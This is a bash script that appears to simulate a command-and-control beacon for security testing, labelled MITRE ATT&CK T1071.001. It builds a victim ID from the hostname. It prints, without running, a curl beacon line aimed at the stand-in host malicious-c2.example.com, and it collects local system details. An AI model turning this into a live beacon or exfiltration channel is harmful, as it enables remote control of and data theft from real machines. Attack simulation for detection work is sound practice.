#!/bin/bash
# Attack: Command & Control via Remote Access
# MITRE ATT&CK: Command and Control - T1071.001
# Severity: CRITICAL
# Description: Establishes a command and control channel for remote access

set -e
echo "[+] Starting: Command & Control via Remote Access"
echo "[+] MITRE ATT&CK: T1071.001 - Application Layer Protocol: Web Protocols"
echo "[+] Severity: CRITICAL"
echo ""

echo "[*] Step 1: Establishing C2 beacon..."
C2_SERVER="http://malicious-c2.example.com"
BEACON_INTERVAL=60

echo "[*] C2 Server: $C2_SERVER"
echo "[*] Beacon Interval: ${BEACON_INTERVAL}s"

echo ""
echo "[*] Step 2: Sending initial beacon..."
VICTIM_ID=$(hostname)-$(date +%s)
echo "[*] Victim ID: $VICTIM_ID"

echo ""
echo "[*] Step 3: Simulating C2 communication..."
for i in {1..3}; do
    echo "[*] Beacon $i: Checking for commands..."
    echo "    curl -s -H 'X-Victim-ID: $VICTIM_ID' $C2_SERVER/api/commands"

    # Simulate command received
    if [ $i -eq 2 ]; then
        echo "[*] Command received: whoami"
        whoami
    fi

    sleep 1
done

echo ""
echo "[*] Step 4: Exfiltrating system information..."
echo "[*] System info:"
echo "    OS: $(uname -s)"
echo "    Kernel: $(uname -r)"
echo "    User: $(whoami)"

echo ""
echo "[✓] C2 simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Maintain persistent connection to C2 server"
echo "    - Execute remote commands"
echo "    - Exfiltrate data"
echo "    - Download additional payloads"
